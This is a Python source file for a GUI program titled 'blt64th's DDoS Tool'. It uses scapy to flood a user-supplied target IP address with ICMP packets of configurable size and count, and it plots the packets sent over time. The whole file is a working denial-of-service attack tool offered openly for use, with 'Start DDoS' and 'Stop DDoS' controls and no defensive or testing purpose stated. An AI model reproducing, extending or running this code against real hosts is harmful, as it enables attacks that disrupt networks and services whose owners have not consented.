import tkinter as tk
from tkinter import font as tkfont
from threading import Thread
from scapy.all import IP, ICMP, send
import time
import matplotlib.pyplot as plt
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg

running = False
sent_count = 0
packet_times = []
packet_counts = []
start_time = None

BG_COLOR = "#121212"
FG_COLOR = "#E0E0E0"
ACCENT_COLOR = "#FF0000"
WARNING_COLOR = "#FF5555"
FLASH_COLORS = ("#00FFAA", "#005544")

def flood(target_ip, packet_size, total_packets):
    global sent_count, running, start_time
    payload = b"X" * packet_size
    packet = IP(dst=target_ip)/ICMP()/payload
    batch_size = 10
    start_time = time.time()
    while running and sent_count < total_packets:
        for _ in range(batch_size):
            if sent_count >= total_packets or not running:
                break
            send(packet, verbose=False)
            sent_count += 1
        elapsed = time.time() - start_time
        packet_times.append(elapsed)
        packet_counts.append(sent_count)
        time.sleep(0.01)
    running = False

def start_flood():
    global running, sent_count, packet_times, packet_counts, start_time
    ip = ip_entry.get().strip()
    try:
        size = int(size_entry.get().strip())
        total = int(total_entry.get().strip())
        if size < 0 or size > 65500:
            status_label.config(text="Packet size must be 0-65500", fg=WARNING_COLOR)
            return
        if total <= 0:
            status_label.config(text="Number of packets must be > 0", fg=WARNING_COLOR)
            return
    except:
        status_label.config(text="Invalid input", fg=WARNING_COLOR)
        return
    est_time = total * 0.01
    status_label.config(text=f"Estimated time: {est_time:.1f} sec (fast mode)", fg=ACCENT_COLOR)
    running = True
    sent_count = 0
    packet_times = []
    packet_counts = []
    start_time = None
    start_btn.config(state="disabled")
    stop_btn.config(state="normal")
    t = Thread(target=flood, args=(ip, size, total), daemon=True)
    t.start()
    update_plot()
    flash_label()

def flash_label():
    global running
    if not running:
        start_btn.config(state="normal")
        stop_btn.config(state="disabled")
        status_label.config(text=f"DDoS complete. Packets sent: {sent_count}", fg=ACCENT_COLOR)
        return
    current_color = status_label.cget("fg")
    new_color = FLASH_COLORS[1] if current_color == FLASH_COLORS[0] else FLASH_COLORS[0]
    status_label.config(text=f"Packets sent: {sent_count}", fg=new_color)
    root.after(100, flash_label)

def stop_flood():
    global running
    running = False
    start_btn.config(state="normal")
    stop_btn.config(state="disabled")
    status_label.config(text=f"DDoS stopped. Packets sent: {sent_count}", fg=ACCENT_COLOR)

def update_plot():
    if packet_times and packet_counts:
        ax.clear()
        ax.set_facecolor("red")
        fig.patch.set_facecolor("red")
        ax.plot(packet_times, packet_counts, color="black", linewidth=2)
        ax.grid(True, color="black")
        ax.set_title("Packets Sent Over Time", color="black")
        ax.set_xlabel("Time (s)", color="black")
        ax.set_ylabel("Packets Sent", color="black")
        ax.set_ylim(0, max(packet_counts) + 10)
        canvas.draw()
    if running:
        root.after(500, update_plot)

root = tk.Tk()
root.title("blt64th's DDoS Tool")
root.configure(bg=BG_COLOR)
root.geometry("500x400")

try:
    wave_font = tkfont.Font(family="Courier New", size=12, weight="bold", slant="italic")
except:
    wave_font = ("Courier", 12, "italic")

title_label = tk.Label(root, text="blt64th's DDoS Tool", fg=ACCENT_COLOR, bg=BG_COLOR, font=("Courier New", 20, "bold italic"))
title_label.pack(pady=10)

frame = tk.Frame(root, bg=BG_COLOR)
frame.pack(padx=20)

labels = ["Target IP:", "Packet Size:", "Number of Packets:"]
entries = []

for i, text in enumerate(labels):
    lbl = tk.Label(frame, text=text, fg=FG_COLOR, bg=BG_COLOR, font=wave_font)
    lbl.grid(row=i, column=0, sticky="e", pady=6, padx=5)
    ent = tk.Entry(frame, bg="#222222", fg=ACCENT_COLOR, insertbackground=ACCENT_COLOR,
                   font=wave_font, relief="flat", width=20)
    ent.grid(row=i, column=1, pady=6, padx=5)
    entries.append(ent)

ip_entry, size_entry, total_entry = entries

def on_enter(e):
    e.widget.config(bg=ACCENT_COLOR, fg=BG_COLOR)

def on_leave(e):
    e.widget.config(bg=BG_COLOR, fg=ACCENT_COLOR)

start_btn = tk.Button(root, text="Start DDoS", command=start_flood,
                      bg=BG_COLOR, fg=ACCENT_COLOR, relief="solid", borderwidth=2,
                      font=wave_font, width=15)
start_btn.pack(side="left", padx=40, pady=15)
start_btn.bind("<Enter>", on_enter)
start_btn.bind("<Leave>", on_leave)

stop_btn = tk.Button(root, text="Stop DDoS", command=stop_flood, state="disabled",
                     bg=BG_COLOR, fg=ACCENT_COLOR, relief="solid", borderwidth=2,
                     font=wave_font, width=15)
stop_btn.pack(side="right", padx=40, pady=15)
stop_btn.bind("<Enter>", on_enter)
stop_btn.bind("<Leave>", on_leave)

status_label = tk.Label(root, text="Idle", fg=ACCENT_COLOR, bg=BG_COLOR, font=wave_font)
status_label.pack(pady=10)

fig, ax = plt.subplots(figsize=(5,2))
ax.set_title("Packets Sent Over Time")
ax.set_xlabel("Time (s)")
ax.set_ylabel("Packets Sent")
ax.set_ylim(0, 100)
ax.grid(True)

canvas = FigureCanvasTkAgg(fig, master=root)
canvas.get_tk_widget().pack(pady=5)

root.mainloop()
